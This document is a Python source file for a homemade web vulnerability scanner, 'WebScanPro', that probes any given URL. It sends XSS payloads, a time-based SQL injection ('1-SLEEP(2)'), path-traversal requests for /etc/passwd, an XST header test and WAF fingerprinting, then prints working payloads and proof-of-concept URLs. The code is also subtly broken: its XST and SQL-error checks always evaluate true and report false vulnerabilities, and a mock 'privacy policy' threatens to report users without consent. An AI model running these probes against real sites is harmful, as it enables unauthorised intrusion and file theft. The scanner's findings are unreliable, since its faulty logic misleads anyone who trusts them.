#Code Made By Rayan25062011
#Version 1.2
#xss
#sql
#lfi
#xst
#waf

import requests
import sys
import os
import random
import time

CEND      = '\33[0m'
CBOLD     = '\33[1m'
CITALIC   = '\33[3m'
CURL      = '\33[4m'
CBLINK    = '\33[5m'
CBLINK2   = '\33[6m'
CSELECTED = '\33[7m'

CBLACK  = '\33[30m'
CRED    = '\33[31m'
CGREEN  = '\33[32m'
CYELLOW = '\33[33m'
CBLUE   = '\33[34m'
CVIOLET = '\33[35m'
CBEIGE  = '\33[36m'
CWHITE  = '\33[37m'

CBLACKBG  = '\33[40m'
CREDBG    = '\33[41m'
CGREENBG  = '\33[42m'
CYELLOWBG = '\33[43m'
CBLUEBG   = '\33[44m'
CVIOLETBG = '\33[45m'
CBEIGEBG  = '\33[46m'
CWHITEBG  = '\33[47m'

CGREY    = '\33[90m'
CRED2    = '\33[91m'
CGREEN2  = '\33[92m'
CYELLOW2 = '\33[93m'
CBLUE2   = '\33[94m'
CVIOLET2 = '\33[95m'
CBEIGE2  = '\33[96m'
CWHITE2  = '\33[97m'
END = '\033[0m'
dir_ = os.listdir()

def policy():
    print(f"""
                            {CRED2}Privacy Policy{END}
    If you accept these terms and conditions you will agree on:
    checking your dir with the name 'webscanpro' or 'WebScanPro' that end with '.py', '.exe'.
    If found, you will be reported without any concent, you are warned.
    'WebScanPro' is not a copiable name, please do not use this name without my permission.

    We use harmless exploits such as: '<script>alert("inject")</script>' see? harmless.
    These exploits again harmless are used to see if the website is injectable. If not,
    it will show an error that the injection has failed. Once failed, it will mean that
    the website is safe.

    This system even detects Cloudflare protection. And detects WAF too.



    If you don't accept these terms, you will not be able to use this system.


    """)
def ready_up():
    print("Privacy Policy is loading...")
    time.sleep(0.9)
    policy()
    accept_terms = input(f"{CGREEN}Accept{END} these terms [{CGREEN}y{END}/{CRED}n{END}] {CBLUE}>{END} ")
    if accept_terms == "y":
        print(f"{CGREEN}Thank you{END} for accepting!")
        try:
            import secrets
        except ModuleNotFound:
            print("'secrets' library is not installed!")
            sys.exit()
        token = secrets.token_hex(nbytes=16)
        f = open("aprrovedPolicyToken.txt", "a")
        f.write(token)
        f.close()
        print("approvedPolicyToken.txt has been created! do not delete!")
        
        
def start_banner():
    print(f"""

 \033[91m.       __        _        _____                      .___\033[0m              
 \033[93m/       |    ___  \ ___   (        ___    ___  , __   /   \ .___    __. \033[0m
 \033[91m|       |  .'   ` |/   \   `--.  .'   `  /   ` |'  `. |,_-' /   \ .'   \ \033[0m
 \033[93m|  /\   /  |----' |    `      |  |      |    | |    | |     |   ' |    | \033[0m
 \033[91m|,'  \,'   `.___, `___,' \___.'   `._.' `.__/| /    | /     /      `._.'\033[0m
                                                                         
                    [{CBLUE2}+{END}] Note that the safer the website is, the slower the program
                    [{CRED}!{END}] PRG_END means --> END OF PROGRAM
    """)
def xst_(url):
    print(f"\n[{CBLUE}INFO{END}] Working on XST")
    headers = {"Test":"Hello_Word"}
    req = requests.get(url, headers=headers)
    head = req.headers
    if "Test" or "test" in head:
        print(f"[{CYELLOW}MSG{END}] This site seems vulnerable to Cross Site Tracing(XST)!")
    else:
        print(f"[{CRED}FAIL{END}] XST failed!")

def lfi_(url):
    print(f"\n[{CBLUE}INFO{END}] Testing LFI")
    payloads = ['../etc/passwd','../../etc/passwd','../../../etc/passwd','../../../../etc/passwd','../../../../../etc/passwd','../../../../../../etc/passwd','../../../../../../../etc/passwd','../../../../../../../../etc/passwd']
    urlt = url.split("=")
    urlt = urlt[0] + '='
    for pay in payloads:
        uur = urlt + pay
        req = requests.get(uur).text
        if "root:x:0:0" in req:
            print(f"[{CYELLOW}MSG{END}] Payload found.")
            print(f"[{CYELLOW}MSG{END}] Payload:",pay)
            print(f"[{CYELLOW}MSG{END}] POC",uur)
            break
        if "root:x:0:0" not in req:
            for i in range(1):
                print(f"[{CRED}FAIL{END}] No payload n'or POC found!")

def sql_(url):
    print(f"\n[{CBLUE}INFO{END}] Working on SQL")
    urlt = url.split("=")
    urlt = urlt[0] + '='
    urlb = urlt + '1-SLEEP(2)'

    time1 = time.time()
    req = requests.get(urlb)
    time2 = time.time()
    timet = time2 - time1
    timet = str(timet)
    timet = timet.split(".")
    timet = timet[0]
    if int(timet) >= 2:
        print(f"[{CYELLOW}MSG{END}] Blind SQL injection time based found!")
        print(f"[{CYELLOW}MSG{END}] Payload:",'1-SLEEP(2)')
        print(f"[{CYELLOW}MSG{END}] POC:",urlb)
    else:
        print(f"[{CRED}FAIL{END}] SQL time based failed.")


    payload1 = "'"
    urlq = urlt + payload1
    reqqq = requests.get(urlq).text
    if 'mysql_fetch_array()' or 'You have an error in your SQL syntax' or 'error in your SQL syntax' \
            or 'mysql_numrows()' or 'Input String was not in a correct format' or 'mysql_fetch' \
            or 'num_rows' or 'Error Executing Database Query' or 'Unclosed quotation mark' \
            or 'Error Occured While Processing Request' or 'Server Error' or 'Microsoft OLE DB Provider for ODBC Drivers Error' \
            or 'Invalid Querystring' or 'VBScript Runtime' or 'Syntax Error' or 'GetArray()' or 'FetchRows()' in reqqq:
        print(f"\n[{CYELLOW}MSG{END}] SQL Error found.")
        print(f"[{CSELECTED}PAYLOAD{END}] Payload:",payload1)
        print(f"[{CBEIGE}POC{END}] POC:",urlq)
    else:
        pass
def xss_(url):
    paydone = []
    payloads = ['injectest','/inject','//inject//','<inject','(inject','"inject','<script>alert("inject")</script>']
    print(f"[{CBLUE}INFO{END}] Working on XSS")
    print(f"[{CYELLOW}MSG{END}] {CBLUE2}10{END} Payloads.")

    urlt = url.split("=")
    urlt = urlt[0] + '='
    for pl in payloads:
        urlte = urlt + pl
        re = requests.get(urlte).text
        if pl in re:
            paydone.append(pl)
        else:
            pass
    url1 = urlt + '%27%3Einject%3Csvg%2Fonload%3Dconfirm%28%2Finject%2F%29%3Eweb'
    req1 = requests.get(url1).text
    if "'>inject<svg/onload=confirm(/inject/)>web" in req1:
        paydone.append('%27%3Einject%3Csvg%2Fonload%3Dconfirm%28%2Finject%2F%29%3Eweb')
    else:
        pass

    url2 = urlt + '%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E'
    req2 = requests.get(url2).text
    if '<script>alert("inject")</script>' in req2:
        paydone.append('%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E')
    else:
        pass

    url3 = urlt + '%27%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E'
    req3 = requests.get(url3).text
    if '<script>alert("inject")</script>' in req3:
        paydone.append('%27%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E')
    else:
        pass

    if len(paydone) == 0:
        print(f"[{CRED}FAIL{END}] Was not possible to exploit XSS.")
    else:
        print(f"[{CYELLOW}MSG{END}]",len(paydone),"Payloads were found.")
        for p in paydone:
            print(f"\n[{CYELLOW}MSG{END}]{CSELECTED} Payload found!")
            print(f"[{CYELLOW}MSG{END}] {CSELECTED}Payload:",p)
            print(f"[{CYELLOW}MSG{END}] {CSELECTED}POC:",urlt+p)


def checkwaf(url):
    try:
        sc = requests.get(url)
        if sc.status_code == 200:
            sc = sc.status_code
        else:
            print(f"[{CRED}FAIL{END}] Error with status code:", sc.status_code)
    except:
        print(f"[{CRED}FAIL{END}] Error with the first request.")
        exit()
    r = requests.get(url)

    opt = ["Yes","yes","Y","y"]
    try:
        if r.headers["server"] == "cloudflare":
            print("[\033[1;31m!\033[0;0m]The Server is Behind a CloudFlare Server.")
            ex = input("[\033[1;31m!\033[0;0m]Exit y/n: ")
            if ex in opt:
                exit("[\033[1;33m!\033[0;0m] - Quitting")
    except:
        pass

    noise = "?=<script>alert()</script>"
    fuzz = url + noise
    waffd = requests.get(fuzz)
    if waffd.status_code == 406 or waffd.status_code == 501:
        print("[\033[1;31m!\033[0;0m] WAF Detected.")
    if waffd.status_code == 999:
        print("[\033[1;31m!\033[0;0m] WAF Detected.")
    if waffd.status_code == 419:
        print("[\033[1;31m!\033[0;0m] WAF Detected.")
    if waffd.status_code == 403:
        print("[\033[1;31m!\033[0;0m] WAF Detected.")
    else:
        print(f"[{CYELLOW}MSG{END}] No WAF Detected.")
def header(url):
    h = requests.get(url)
    he = h.headers

    try:
        print(f"{CGREEN2}Server:{END}",he['server'])
    except:
        pass
    try:
        print(f"{CGREEN2}Data:{END}",he['date'])
    except:
        pass
    try:
        print(f"{CGREEN2}Powered:{END}",he['x-powered-by'])
    except:
        pass
    print("\n")
def banner(url):
    try:
        sc = requests.get(url)
        if sc.status_code == 200:
            sc = sc.status_code
        else:
            print(f"[{CYELLOW}MSG{END}] Error with status code:",sc.status_code)
    except:
        print(f"[{CYELLOW}MSG{END}] Error with the first request.")
        exit()
    
    print("""
    WebScanPro
    ----------
    Target --> {}
    
    
    """.format(url))
def help():
    print(f"""
    \33[4mPowered by{END} {CSELECTED}Rayan25062011{END}
            |
            ▼
        {CRED}Web{END}{CBLUE}Scan{END}{CVIOLET}Pro{END}

    ex: \33[94mpython3 webscanpro.py{END} http://example.com/page.php?id=value
    """)
    exit()

try:
    arvs = sys.argv
    url = arvs[1]
except:
    print(f"{CRED}ERROR!{END} No URL to scan!")
    help()

if 'http' not in url:
    print(f"{CRED}ERROR! SCHEME {END}'{CBLUE}http://'{CBLUE}{CRED} IS NOT IN {url}{END}")

    help()

if '?' not in url:
    print(f"{CRED}ERROR! PARAMETER {END}'{CBLUE}?{END}'{CRED} IS NOT IN {url}{END}")
    help()



timing1 = time.time()
ready_up()
start_banner()
time.sleep(0.4)
checkwaf(url)
banner(url)
header(url)
xss_(url)
sql_(url)
lfi_(url)
xst_(url)
timing2 = time.time()
timet = timing2 - timing1
timet = str(timet)
timet = timet.split(".")
print(f"\n[{CRED}PRG_END{END}]{CGREY} Time used:{END}",timet[0],"seconds.\n")
